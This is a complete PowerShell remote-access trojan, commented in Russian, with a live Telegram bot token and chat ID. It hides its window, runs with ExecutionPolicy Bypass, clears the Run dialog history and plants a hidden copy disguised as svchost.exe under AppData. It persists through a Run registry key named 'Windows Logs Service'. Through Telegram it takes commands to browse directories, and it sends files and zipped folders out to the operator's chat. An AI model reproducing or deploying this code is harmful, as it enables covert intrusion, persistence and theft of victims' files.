# RAT через Telegram Bot - ПОЛНОСТЬЮ СКРЫТАЯ ВЕРСИЯ
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# ПОЛНОЕ СКРЫТИЕ ОКНА - запускаем новый скрытый процесс и завершаем текущий
if (-not $global:Restarted) {
    $global:Restarted = $true
    
    # Сохраняем скрипт во временный файл
    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
    $currentContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
    $currentContent | Out-File -FilePath $tempScript -Encoding UTF8
    
    # Запускаем новый полностью скрытый процесс
    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processStartInfo.FileName = "powershell.exe"
    $processStartInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
    $processStartInfo.CreateNoWindow = $true
    $processStartInfo.UseShellExecute = $false
    $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processStartInfo
    $process.Start() | Out-Null
    
    # Завершаем текущий видимый процесс
    exit
}

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
    } catch { 
        # Молча игнорируем ошибки отправки
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        # Молча игнорируем ошибки отправки файлов
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        return $false
    }
}

# Функция очистки RAT
function Invoke-Cleanup {
    # Отправляем начало очистки
    Send-Telegram "🔍 Начинается полная очистка RAT..."

    # 1. Завершаем все процессы RAT
    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

    $processes = Get-Process | Where-Object {
        $_.ProcessName -eq "powershell" -or 
        $_.ProcessName -eq "pwsh" -or
        $_.ProcessName -eq "cmd"
    }

    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*8429674512*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. Удаляем файлы RAT
    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"

    $filesToDelete = @(
        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
        "$env:TEMP\WindowsSystem.exe",
        "$env:TEMP\cleanup_*.ps1",
        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
        "$env:TEMP\rat_installed.marker",
        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($filePattern in $filesToDelete) {
        try {
            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                $deletedFiles += $_.FullName
            }
        } catch { }
    }

    # 3. Очищаем автозагрузку реестра
    Send-Telegram "🔄 Этап 3: Очистка реестра"

    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
            if ($value1) {
                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Defender Security"
            }
            
            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
            if ($value2) {
                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Audio Service"
            }
            
            $value3 = Get-ItemProperty -Path $regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
            if ($value3) {
                Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Logs Service"
            }
        } catch { }
    }

    # 4. Очищаем историю RUN
    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. Финальный отчет
    $report = @"
✅ ОЧИСТКА RAT ЗАВЕРШЕНА

Удаленные файлы:
$($deletedFiles -join "`n")

Удаленные записи реестра:
$($regEntries -join "`n")

Все следы RAT успешно удалены.
"@

    Send-Telegram $report
    return $true
}

# Установка в автозагрузку
$installMarker = "$env:TEMP\windows_update.marker"

# Проверяем, не установлен ли уже RAT
if (!(Test-Path $installMarker)) {
    # Создаем маркер установки
    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    
    # Скрытая папка в AppData
    $hiddenFolder = "$env:APPDATA\Microsoft\WindowsLogs"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        attrib +h "$hiddenFolder" 2>&1 | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\svchost.exe"
    
    # Сохраняем текущий скрипт в новое место
    $currentScriptContent = @'
# RAT через Telegram Bot - СКРЫТАЯ ВЕРСИЯ
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Очистка истории RUN
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{ chat_id = $ChatID; text = $Message }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
    } catch { }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary", "Content-Disposition: form-data; name=`"chat_id`"", "", $ChatID,
            "--$boundary", "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream", "", $fileEnc, "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch { }
}

function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch { return $false }
}

function Invoke-Cleanup {
    Send-Telegram "🔍 Начинается полная очистка RAT..."
    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

    $processes = Get-Process | Where-Object { $_.ProcessName -eq "powershell" -or $_.ProcessName -eq "pwsh" -or $_.ProcessName -eq "cmd" }
    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*8429674512*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*svchost.exe*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    $filesToDelete = @(
        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($filePattern in $filesToDelete) {
        try {
            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                $deletedFiles += $_.FullName
            }
        } catch { }
    }

    $regPaths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
            $regEntries += "$regPath\Windows Logs Service"
        } catch { }
    }

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    $report = "✅ ОЧИСТКА RAT ЗАВЕРШЕНА`nУдаленные файлы:`n$($deletedFiles -join "`n")`nУдаленные записи реестра:`n$($regEntries -join "`n")"
    Send-Telegram $report
    return $true
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# Очистка истории сообщений
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help - список команд`n/ls - список файлов`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл`n/destroy - самоуничтожение"

while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:`n/help - показать это сообщение`n/ls - список файлов в текущей директории`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл или папку`n/destroy - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir`n$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir`n$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            try {
                                $cleanupResult = Invoke-Cleanup
                                if ($cleanupResult) {
                                    Start-Sleep -Seconds 3
                                    Stop-Process -Id $pid -Force
                                }
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении"
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch { }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
'@

    $currentScriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
    attrib +h "$scriptPath" 2>&1 | Out-Null
}

# Установка в автозагрузку
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }

$uniqueName = "Windows Logs Service"
Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\WindowsLogs\svchost.exe`"" -Force -ErrorAction SilentlyContinue

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# Очистка истории сообщений при запуске
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/destroy - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/destroy - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            
                            try {
                                # Запускаем встроенную функцию очистки
                                $cleanupResult = Invoke-Cleanup
                                
                                if ($cleanupResult) {
                                    # Даем время на отправку финального сообщения
                                    Start-Sleep -Seconds 3
                                    
                                    # Завершаем текущий процесс
                                    Stop-Process -Id $pid -Force
                                }
                                
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
                                
                                # Аварийная очистка
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch {
                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
